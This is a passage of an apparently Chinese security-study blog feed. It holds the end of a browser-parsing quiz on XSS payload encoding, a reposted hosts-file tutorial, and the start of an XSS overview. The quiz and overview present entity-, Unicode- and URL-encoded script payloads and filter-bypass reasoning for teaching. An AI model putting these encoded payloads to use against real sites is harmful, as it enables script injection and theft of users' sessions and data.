class="name">button</span> <span class="attr">onclick</span>=<span class="string">"confirm('7&amp;#39;);"</span>&gt;</span>Button<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>待续</p></blockquote><p><code>0x08</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"confirm('8\u0027);"</span>&gt;</span>Button<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>待续</p></blockquote><p><code>0x09</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#57;&amp;#41;&amp;#59;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>不能弹窗。因为在<code>原始文本元素</code>（<code>&lt;script&gt;</code> 和 <code>&lt;style&gt;</code>）类型标签下的所有字符实体编码都不会被 HTML 解码。因此上述语句不会被解码。</p></blockquote><p><code>0x0A-</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#57;&amp;#41;&amp;#59;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>能弹窗。<sup>[0x08] &amp; [0x09]</sup> </p><p><img src="/images/95-6.jpg" alt></p><ul><li><p><font color="red"><strong>分析一</strong></font>：因为 <code>&lt;svg&gt;</code> 属于 <code>XML</code> 元素，不是 <code>HTML</code> 标签，因为下 xml 支持在标签内解析HTML实体字符，所以实体编码在 XML 中会被解析，并被执行。在 XML 中实体会自动转义，除了<code>&lt;![CDATA[</code>和<code>]]&gt;</code>包含的实体。</p></li><li><p><font color="red"><strong>分析二</strong></font>：待续</p></li></ul></blockquote><p><code>0x0A</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006c\u0065\u0072\u0074(10);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>能弹窗。因为<font color="red"><strong>Unicode 序列不能出现在控制字符中，否则不能被解释。</strong></font>而 <code>\u0061\u006c\u0065\u0072\u0074</code> 中没有控制符，将 <code>Unicode</code> 解码后成为 <code>alert</code> ，它只是标识符</p></blockquote><p><code>0x0B</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>不会弹窗。<code>javascript</code>解码器会将 <code>\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029</code> 解码为 <code>alert(1)</code>，该结果中的控制字符<code>(</code> 和 <code>)</code> 被编码了，所以不能被正常解释。</p></blockquote><p><code>0x0C</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>不能弹窗。被编码部分为 alert 及括号内为12。原因在于括号内被编码的部分不能被正常解释，即使反编码之后为数字，但是仍然按照<code>字符串</code>来处理（<font color="navy"><strong>这里的12为字符串12，并不是int整数</strong></font>）。要么使用 ASCII 数字，要么加” “或’ ‘使其变为字符串，作为字符串也只能作为普通字符。</p></blockquote><p><code>0x0D</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert('13\u0027)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>不能被执行。<code>\u0027</code> 被编码为 <code>&#39;</code> ，该符号属于控制字符，所以这里控制字符被编码了，解码后的 <code>&#39;</code> 将<strong>变为字符串的一部分，而不再解释为控制字符</strong>。因此该例中字符串是不完整的，因为没有 <code>&#39;</code> 来结束字符串。</p></blockquote><p><code>0x0E</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'14\u000a'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>能被成功执行。和 <code>0x0D</code> 进行对比可知，这里有 <code>&#39;</code> 符号作为控制字符来结束字符串，所以能够被执行。</p></blockquote><p><code>0x0F</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>能被执行。分析过程如下：</p><p><code>步骤 ①</code> ：首先是HTML 解析，将 <code>&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;</code>  解码为 <code>javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(15)</code> </p><p><code>步骤 ②</code> ：因为 <code>href</code> 属性，因为存在着 <code>javascript:</code> 伪协议，所以紧接着进行 <code>URL 解析</code>，将 <code>javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(15)</code> 解析为 <code>javascript:\u0061\u006c\u0065\u0072\u0074(15)</code> </p><p><code>步骤 ③</code>：最后通过 <code>javascript 解析器</code> 将 <code>javascript:\u0061\u006c\u0065\u0072\u0074(15)</code>  解码为 <code>javascript:alert(15)</code> ，所以最终得到的结果是 <code>&lt;a href=javascript:alert(15)&gt;&lt;/a&gt;</code>，在<code>Unicode</code> 解码过程中，并没有控制字符被编码，所以 <code>javascript:alert(15)</code> 能成功地被执行。</p></blockquote><h3 id="四、参考文献"><a href="#四、参考文献" class="headerlink" title="四、参考文献"></a><font color="navy">四、参考文献</font></h3><p><strong>0x01</strong> 深入理解浏览器解析机制和XSS向量编码：<a href="http://bobao.360.cn/learning/detail/292.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/292.html</a></p><p><strong>0x02</strong> 浏览器渲染原理与编码解码：<a href="https://lalajun.github.io/2018/08/25/浏览器渲染原理与编码解码/#unicode编码-javascript解析器" target="_blank" rel="noopener">https://lalajun.github.io/2018/08/25/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/#unicode%E7%BC%96%E7%A0%81-javascript%E8%A7%A3%E6%9E%90%E5%99%A8</a></p><p><strong>0x03</strong> 浏览器编码题目：<a href="http://test.attacker-domain.com/browserparsing/answers.txt" target="_blank" rel="noopener">http://test.attacker-domain.com/browserparsing/answers.txt</a></p><p><strong>0x04</strong> 一次对浏览器解析和XSS的深度探究：<a href="https://www.freebuf.com/articles/web/222849.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/222849.html</a></p><p><strong>0x05</strong> 深入探究浏览器编码及XSS Bypass：<a href="https://mp.weixin.qq.com/s/liODgY4NjYqdWg3JgPXMdA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/liODgY4NjYqdWg3JgPXMdA</a></p><p><strong>0x06</strong> XSS与字符编码及浏览器解析原理：<a href="http://www.lin2zhen.top/index.php/archives/16/" target="_blank" rel="noopener">http://www.lin2zhen.top/index.php/archives/16/</a></p><p><strong>0x07</strong> HTML5/syntax：<a href="https://www.w3.org/html/ig/zh/wiki/HTML5/syntax" target="_blank" rel="noopener">https://www.w3.org/html/ig/zh/wiki/HTML5/syntax</a></p><p><strong>0x08</strong> SVG XSS的一个黑魔法：<a href="https://www.hackersb.cn/hacker/85.html" target="_blank" rel="noopener">https://www.hackersb.cn/hacker/85.html</a></p><p><strong>0x09</strong> 图片XSS小结：<a href="https://www.mi1k7ea.com/2019/03/22/图片XSS小结/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/03/22/%E5%9B%BE%E7%89%87XSS%E5%B0%8F%E7%BB%93/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、判断下列语句能否成功执行&quot;&gt;&lt;a href=&quot;#一、判断下列语句能否成功执行&quot; class=&quot;headerlink&quot; title=&quot;一、判断下列语句能否成功执行&quot;&gt;&lt;/a&gt;&lt;font color=&quot;navy&quot;&gt;一、判断下列语句能否成功执行&lt;/font&gt;&lt;/h3
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>【转载】文件 HOSTS 的简介和修改方法</title>
    <link href="https://muzibing.github.io/2020/02/23/2020.02.23%EF%BC%8893%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/02/23/2020.02.23（93）/</id>
    <published>2020-02-22T16:00:00.000Z</published>
    <updated>2020-02-23T00:43:23.868Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、什么是-hosts"><a href="#一、什么是-hosts" class="headerlink" title="一、什么是 hosts"></a>一、什么是 hosts</h2><p>hosts —— the static table lookup for host name（主机名查询静态表）。</p><p>hosts文件是一个用于储存计算机网络中各节点信息的计算机文件。这个文件负责将主机名映射到相应的IP地址。hosts文件通常用于补充或取代网络中DNS的功能。和DNS不同的是，计算机的用户可以直接对hosts文件进行控制。</p><p>Hosts是一个没有扩展名的系统文件，其作用就是将一些常用的网址<a href="https://baike.baidu.com/item/域名/86062" target="_blank" rel="noopener">域名</a>与其对应的<a href="https://baike.baidu.com/item/IP地址" target="_blank" rel="noopener">IP地址</a>建立一个关联“数据库”，当用户在浏览器中输入一个需要登录的网址时，系统会首先自动从<a href="https://baike.baidu.com/item/Hosts文件" target="_blank" rel="noopener">Hosts文件</a>中寻找对应的<a href="https://baike.baidu.com/item/IP地址" target="_blank" rel="noopener">IP地址</a>，一旦找到，系统会立即打开对应网页，如果没有找到，则系统会再将网址提交DNS<a href="https://baike.baidu.com/item/域名解析" target="_blank" rel="noopener">域名解析</a>服务器进行IP地址的解析。</p><p>优先级 ： dns缓存 &gt; hosts &gt; dns服务</p><h2 id="二、hosts的位置"><a href="#二、hosts的位置" class="headerlink" title="二、hosts的位置"></a>二、hosts的位置</h2><p><a href="https://laod.cn/tag/hosts" target="_blank" rel="noopener">hosts</a>在各个系统中所在的文件夹：</p><ul><li>Windows 系统<a href="https://laod.cn/tag/host" target="_blank" rel="noopener">host</a>s位于 C:\Windows\System32\drivers\etc\hosts</li><li>Android（安卓）系统hosts位于 /etc/hosts</li><li>Mac（苹果电脑）系统hosts位于 /etc/hosts</li><li>iPhone（iOS）系统hosts位于 /etc/hosts</li><li>Linux系统hosts位于 /etc/hosts</li><li>绝大多数Unix系统都是在 /etc/hosts</li></ul><h2 id="三、hosts的内容"><a href="#三、hosts的内容" class="headerlink" title="三、hosts的内容"></a>三、hosts的内容</h2><p>Windows版本的hosts文件内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># Copyright (c) 1993-2009 Microsoft Corp.</span><br><span class="line"># # This is a sample HOSTS file used by Microsoft TCP/IP for Windows.</span><br><span class="line">#</span><br><span class="line"># This file contains the mappings of IP addresses to host names. Each </span><br><span class="line"># entry should be kept on an individual line. The IP address should</span><br><span class="line"># be placed in the first column followed by the corresponding host name. </span><br><span class="line"># The IP address and the host name should be separated by at least one </span><br><span class="line"># space.</span><br><span class="line"># </span><br><span class="line"># Additionally, comments (such as these) may be inserted on individual</span><br><span class="line"># lines or following the machine name denoted by a &apos;#&apos; symbol.</span><br><span class="line"># </span><br><span class="line"># For example:</span><br><span class="line">#</span><br><span class="line"># 102.54.94.97 rhino.acme.com # source server</span><br><span class="line"># 38.25.63.10 x.acme.com # x client host</span><br><span class="line"># localhost name resolution is handled within DNS itself.</span><br><span class="line"># 127.0.0.1 localhost</span><br><span class="line"># ::1 localhost</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>#后都是注释，所以清空hosts文件对系统正常运行并没有什么影响。</p><p>在一个局域网中，每台机器都有一个主机名，用于区分主机，便于相互访问。</p><p>一般/etc/hosts的内容一般有如下类似内容：</p><p>127.0.0.1  localhost.localdomain   localhost</p><p>192.168.1.100   linumu100.com   linumu100</p><p>192.168.1.120  ftpserver   ftp120</p><p>一般情况下hosts文件的每行尾一个主机，每行由三部分组成，每个部分由空格隔开。</p><p>第一部分：网络IP地址；</p><p>第二部分：主机名或域名；</p><p>第三部分：主机名别名；</p><p>当然每行也可以是两部分，即主机IP地址和主机名。</p><p>主机名（hostname)和域名（domain)的区别：</p><p>主机名通常在局域网内使用，通过hosts文件，主机名就被解析到对应IP;</p><p>域名通常在INTERNET上使用，但如果本机不想使用internet上的域名解析，这时就可以更改hosts文件，加入自己的域名解析。</p><h2 id="四、hosts的作用"><a href="#四、hosts的作用" class="headerlink" title="四、hosts的作用"></a>四、hosts的作用</h2><p>1、加快<a href="https://baike.baidu.com/item/域名解析" target="_blank" rel="noopener">域名解析</a></p><p>对于要经常访问的网站，我们可以通过在Hosts中配置<a href="https://baike.baidu.com/item/域名" target="_blank" rel="noopener">域名</a>和IP的映射关系，提高域名解析速度。由于有了映射关系，当我们输入域名计算机就能很快解析出IP，而不用请求网络上的DNS服务器。</p><p>2、方便局域网用户</p><p>在很多单位的局域网中，会有服务器提供给用户使用。但由于局域网中一般很少架设DNS服务器，访问这些服务器时，要输入难记的IP地址。这对不少人来说相当麻烦。可以分别给这些服务器取个容易记住的名字，然后在Hosts中建立IP映射，这样以后访问的时候，只要输入这个服务器的名字就行了。</p><p>3、屏蔽网站（<a href="https://baike.baidu.com/item/域名重定向" target="_blank" rel="noopener">域名重定向</a>）</p><p>有很多网站不经过用户同意就将各种各样的<a href="https://baike.baidu.com/item/插件" target="_blank" rel="noopener">插件</a>安装到你的计算机中，其中有些说不定就是木马或病毒。对于这些网站我们可以利用Hosts把该网站的<a href="https://baike.baidu.com/item/域名" target="_blank" rel="noopener">域名</a>映射到错误的IP或本地计算机的IP，这样就不用访问了。</p><p>4、顺利连接系统</p><p>对于Lotus的服务器和一些<a href="https://baike.baidu.com/item/数据库服务器" target="_blank" rel="noopener">数据库服务器</a>，在访问时如果直接输入IP地址那是不能访问的，只能输入服务器名才能访问。那么我们配置好Hosts文件，这样输入服务器名就能顺利连接了。</p><p>5.虚拟域名</p><p>很多时候，网站建设者需要把”软环境“搭建好，再进行上传调试。但类似于邮件服务，则需要使用域名来辅助调试，这时就可以将本地 IP 地址与一个”虚拟域名“做地址指向，就可以达到要求的效果，且无需花费。如：</p><ul><li>127.0.0.1 网站域名</li><li>之后在浏览器地址栏中输入对应的网站域名即可。</li></ul><h2 id="五、如何修改hosts"><a href="#五、如何修改hosts" class="headerlink" title="五、如何修改hosts"></a>五、如何修改hosts</h2><h3 id="1、屏蔽网站（域名重定向）"><a href="#1、屏蔽网站（域名重定向）" class="headerlink" title="1、屏蔽网站（域名重定向）"></a>1、屏蔽网站（域名重定向）</h3><p>在WINDOWS系统中，约定 127.0.0.1 为本地计算机的IP地址, 0.0.0.0是错误的IP地址。</p><p>如果，我们在hosts中，写入以下内容：</p><p>127.0.0.1 要屏蔽的网站A的域名</p><p>0.0.0.0 要屏蔽的网站B的域名</p><p>这样，计算机<a href="https://baike.baidu.com/item/解析域名" target="_blank" rel="noopener">解析域名</a>A和 B时，就解析到本机IP或错误的IP，达到了屏蔽网站A 和B的目的。</p><p>在修改hosts文件时候，还常常遇到修改保存后无效的情况，这里要提醒大家注意的一点：很多人是写在最后行，写完最后一行后在没有回车的情况下，这一行是不生效的。一定要记得回车。建议大家遵循这样的习惯：“ip地址+Tab+<a href="https://baike.baidu.com/item/域名" target="_blank" rel="noopener">域名</a>+换行” 添加记录。</p><h3 id="2、局域网用户访问"><a href="#2、局域网用户访问" class="headerlink" title="2、局域网用户访问"></a>2、局域网用户访问</h3><p>如果，我们在A主机的hosts中，写入以下内容：</p><p>B主机的ip B主机名</p><p>这样我们就可以通过B主机名找到B主机及其服务。</p><h3 id="3、android系统的hosts修改"><a href="#3、android系统的hosts修改" class="headerlink" title="3、android系统的hosts修改"></a>3、android系统的hosts修改</h3><p>在 Android 下，/etc 是 link 到 /system/etc 的，我们需要修改 /system/etc/hosts 来实现。但是这个文件是只读，不能通过 shell 直接修改。可以通过连接到 PC 上使用 adb 来修改。步骤如下：</p><p>（1）获得<a href="https://baike.baidu.com/item/root权限" target="_blank" rel="noopener">root权限</a>：adb root</p><p>（2）设置/system为可读写：adb remount</p><p>（3）将<a href="https://baike.baidu.com/item/hosts文件" target="_blank" rel="noopener">hosts文件</a>复制到PC：adb pull /system/etc/hosts</p><p>（4）修改PC机上文件</p><p>（5）将PC机上文件复制到手机：adb push /system/etc/hosts</p><p>如果要查看是否修改成功，可以在PC上执行adb shell，运行cat /system/etc/hosts;或者在手机上运行cat /system/etc/hosts。</p><p>在Android系统中，hosts文件格式有一点与PC机Linux不同：不能在一行中一个IP对应多个<a href="https://baike.baidu.com/item/域名" target="_blank" rel="noopener">域名</a>，比如：</p><p>127.0.0.1 host1.example.com host2.example.com host3.example.com</p><p>在大多PC机Linux系统是合法的，但不能在Android上起作用，需要拆成每个域名一行才能使用：</p><p>x.x.x.x host1.example.com</p><p>x.x.x.x host2.example.com</p><p>x.x.x.x host3.example.com</p><h3 id="4、通过修改hosts上google"><a href="#4、通过修改hosts上google" class="headerlink" title="4、通过修改hosts上google"></a>4、通过修改hosts上google</h3><p>第一步：下载可以正常使用的hosts文件</p><p>可以在百度搜索类似“Google hosts”等相关关键词或者老D，找到最新可用的host文件。</p><p>第二步：修改本地hosts文件</p><p>在电脑系统中找到hosts，路径基本上是C:\Windows\System32\drivers\etc，然后将下载的hosts文件将本地hosts文件替换，或者在本地hosts文件中直接在地址栏修改即可！</p><p>第三步：刷新本地dns</p><p>第二步完成本地hosts文件的修改之后，可以使用dos命令完成最后的操作。</p><p>（1）使用WIN+R键，启动运行，键入cmd</p><p>（2）在dos界面输入“ipcong /flushdns”</p><p>（3）dos命令窗提示“已成功刷新DNS解析缓存”，就完成了。</p><h2 id="六、其他"><a href="#六、其他" class="headerlink" title="六、其他"></a>六、其他</h2><h3 id="1、怎么获取域名所对应的IP地址"><a href="#1、怎么获取域名所对应的IP地址" class="headerlink" title="1、怎么获取域名所对应的IP地址"></a>1、怎么获取域名所对应的IP地址</h3><p>打开“开始――运行”，输入“cmd”，在命令行界面输入“ping www.baidu.com”，回车。</p><p>显示结果类似：Reply from 220.181.6.18:bytes=32 time=24msTTL=55。</p><p>其中的220.181.6.18就是域名所对应IP地址（百度的）。呵呵！</p><h3 id="2、修改hosts后生效方法"><a href="#2、修改hosts后生效方法" class="headerlink" title="2、修改hosts后生效方法"></a>2、修改hosts后生效方法</h3><p>（1）Windows</p><p>开始 -&gt; 运行 -&gt; 输入cmd -&gt; 在CMD窗口输入</p><p>ipconfig /flushdns</p><p>（2）Linux</p><p>打开终端</p><p>重启网络：</p><p>sudo /etc/init.d/networking restart</p><p>desktop版可以这样重启：</p><p>sudo service network-manager restart</p><p> 如果只是修改了某个网卡(例如eth0)的信息，也可以通过重启网卡的方式使其修改生效。</p><p>sudo ifdown eth0 sudo ifup eth0</p><p>如果不懂请都尝试下</p><p>（3）Mac OS X终端输入</p><p> sudo killall -HUP mDNSResponder</p><p>（4）Android</p><p>开启飞行模式 -&gt; 关闭飞行模式</p><p>（5）通用方法</p><p>拔网线(断网) -&gt; 插网线(重新连接网络)</p><p>如不行请清空浏览器缓存（建议不要使用国产浏览器，请使用谷歌Chrome浏览器）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、什么是-hosts&quot;&gt;&lt;a href=&quot;#一、什么是-hosts&quot; class=&quot;headerlink&quot; title=&quot;一、什么是 hosts&quot;&gt;&lt;/a&gt;一、什么是 hosts&lt;/h2&gt;&lt;p&gt;hosts —— the static table lookup f
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>【转载】 XSS 总结</title>
    <link href="https://muzibing.github.io/2020/02/23/2020.02.23%EF%BC%8894%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/02/23/2020.02.23（94）/</id>
    <published>2020-02-22T16:00:00.000Z</published>
    <updated>2020-02-23T02:55:08.699Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p>XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p><h1 id="常用的XSS攻击手段和目的"><a href="#常用的XSS攻击手段和目的" class="headerlink" title="常用的XSS攻击手段和目的"></a>常用的XSS攻击手段和目的</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.盗用cookie，获取敏感信息。</span><br><span class="line">2.利用植入Flash，通过crossdomain权限设置进一步获取更高权限；或者利用Java等得到类似的操作。</span><br><span class="line">3.利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的操作如发微博、加好友、发私信等操作。</span><br><span class="line">4.利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。</span><br><span class="line">5.在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDOS攻击的效果。</span><br></pre></td></tr></table></figure><h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><h2 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中。</span><br><span class="line">反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</span><br></pre></td></tr></table></figure><h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Stored Cross-Site Scripting）。</span><br><span class="line">此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</span><br></pre></td></tr></table></figure><h2 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。客户端 JavaScript 可以访问浏览器的 DOM 文本对象模型，因此能够决定用于加载当前页面的 URL。换句话说，客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行。另一方面，浏览器用户可以操纵 DOM 中的一些对象，例如 URL、location 等。用户在客户端输入的数据如果包含了恶意 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到基于 DOM 的 XSS 攻击。</span><br></pre></td></tr></table></figure><h1 id="无任何过滤情况下"><a href="#无任何过滤情况下" class="headerlink" title="无任何过滤情况下"></a>无任何过滤情况下</h1><h2 id="一些常见标签"><a href="#一些常见标签" class="headerlink" title="一些常见标签"></a>一些常见标签</h2><p><strong>PS：下面我列举的标签大部分是可以自动触发js代码的，无需用户去交互，大部分情况下我们也是希望是自动触发而不是等用户去触发，还有我测试的浏览器是火狐，Chrome，IE11.0，其它的浏览器没有去测试，有兴趣的师傅可以测试一下 =。=</strong></p><p><code>script</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 